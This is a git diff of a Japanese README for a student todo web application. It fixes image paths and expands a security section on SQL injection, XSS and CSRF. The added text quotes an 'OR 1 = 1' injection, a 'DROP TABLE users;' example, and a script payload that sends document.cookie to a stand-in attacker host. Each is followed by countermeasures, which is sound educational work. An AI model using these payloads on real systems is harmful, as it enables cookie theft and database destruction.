@@ -195,19 +195,19 @@ GitHub リポジトリ: [Link](https://github.com/okoge-kaz/todo-application)
 
   - タスクの作成 `/task/new`
 
-    ![](/public/task-new.png)
+    ![](../public/task-new.png)
 
   - タスクの閲覧 `/task/:id`
 
-    ![](/public/task-id.png)
+.    ![](./public/task-id.png)
 
   - タスク一覧表示 `/list`
 
-    ![](/public/task-list.png)
+    ![](../public/task-list.png)
 
   - タスクの編集 `/task/:id/edit`
 
-    ![](/public/task-edit.png)
+    ![](../public/task-edit.png)
 
   - タスクの削除 `/task/:id/delete`
 
@@ -218,7 +218,7 @@ GitHub リポジトリ: [Link](https://github.com/okoge-kaz/todo-application)
   「タスク検索機能を持つ」を`/list`に実装した。
   実際の検索画面は以下
 
-  ![](/public/task-search.png)
+  ![](../public/task-search.png)
 
   具体的には以下の機能を実装した。
 
@@ -337,15 +337,15 @@ GitHub リポジトリ: [Link](https://github.com/okoge-kaz/todo-application)
 
 - タスク編集機能
 
-![](/public/sequence/task-edit.png)
+![](../public/sequence/task-edit.png)
 
 - タスク検索機能
 
-![](/public/sequence/task-search.png)
+![](../public/sequence/task-search.png)
 
 - ログイン機能
 
-![](/public/sequence/user-login.png)
+![](../public/sequence/user-login.png)
 
 #### 2.3 データベース設計
 
@@ -363,7 +363,7 @@ GitHub リポジトリ: [Link](https://github.com/okoge-kaz/todo-application)
 
   ユーザーとタスクの関係を格納するテーブル。(primary key: [user_id, task_id])
 
-![](/public/ER.png)
+![](../public/ER.png)
 
 ## 加点課題
 
@@ -382,16 +382,33 @@ GitHub リポジトリ: [Link](https://github.com/okoge-kaz/todo-application)
 
 #### 3.2 SQL Injection
 
+参考: 詳解セキュリティコンテスト 9章 SQL Injection
+
 - SQL Injection
   - SQL インジェクションとは、Web アプリケーションの SQL クエリに対して、意図しない SQL 文を注入する攻撃手法のこと
-  - SQL インジェクションを行うと、データベースの情報を改ざんしたり、データベースの情報を盗み出したりすることができる
+  - `'SELECT * FROM users WHERE password = ' + password` のように、ユーザーからの入力をそのまま SQL 文に埋め込むと、意図しない SQL 文が実行されてしまう。例えば、`{password} =  OR 1 = 1;` のような入力を受け取った場合、`SELECT * FROM users WHERE password = {password} OR 1 = 1;` という SQL 文が実行されてしまう。これにより、本来はアクセスすることのできないデータにアクセスできてしまう。
+  - もしくは、破壊的な SQL 文 (例: `DROP TABLE users;`) を実行させることで、データベースの破壊を引き起こすこともできる。
+
+- 対策
+
+  ユーザーからの入力をそのまま SQL 文に埋め込まないようにする。具体的には、エスケープ処理や、バリデーションを行うことが考えられる。
 
 #### 3.3 XSS (Cross Site Scripting) and CSRF (Cross Site Request Forgery)
+
+参考: 詳解セキュリティコンテスト 8章 XSS, CSP, CSRF
 
 - XSS (Cross Site Scripting)
 
   - XSS とは、Web アプリケーションに対して、意図しない JavaScript を注入する攻撃手法のこと
   - XSS を行うと、クライアントの Cookie を盗み出したり、クライアントの Cookie を改ざんしたりすることができる
+
+  具体例: `<script> document.location = 'http://example.com/?cookie=' + document.cookie </script>` という JavaScript をクライアントに送信すると、クライアントの Cookie が `http://example.com/?cookie=...` に送信されてしまう。example.com を攻撃者の所有するサーバーにすることで、クライアントの Cookie を盗み出すことができる。
+
+  もしくは、`<script> window.location = 'http://example.com/ </script>` という JavaScriptを埋め込むことに成功すると、そこを訪れたユーザーを任意のサイトに飛ばすことができる。
+
+  - 対策:
+
+    - ユーザーからの入力をそのまま HTML に埋め込まないようにする。具体的には、エスケープ処理や、バリデーションを行うことが考えられる。
 
 - CSRF (Cross Site Request Forgery)
 
@@ -406,18 +423,6 @@ GitHub リポジトリ: [Link](https://github.com/okoge-kaz/todo-application)
   - サーバーは、クライアントがリクエストを送信する際に、CSRF トークンをリクエストボディに含めるように要求する
   - サーバーは、クライアントがリクエストを送信する際に、CSRF トークンを Cookie に含めるように要求する
   - サーバーは、クライアントがリクエストを送信する際に、CSRF トークンをリクエストヘッダに含めるように要求する
-
-- XSS 対策
-
-  - XSS 対策とは、XSS 攻撃を防ぐための対策のこと
-  - XSS 対策としては、HTML エスケープを使用することがある
-  - HTML エスケープとは、HTML の特殊文字をエスケープすることのこと
-  - HTML エスケープとしては、HTML エンティティを使用することがある
-  - HTML エンティティとは、HTML の特殊文字をエスケープするための文字列のこと
-  - HTML エンティティとしては、`&` を `&amp;` に、`<` を `&lt;` に、`>` を `&gt;` に、`"` を `&quot;` に、`'` を `&#x27;` に、`/` を `&#x2F;` に変換することがある
-
-- CORS (Cross Origin Resource Sharing)
-  - CORS とは、クロスオリジン間でリソースを共有するための仕組みのこと
 
 #### 3.4 Server Side Rendering
 
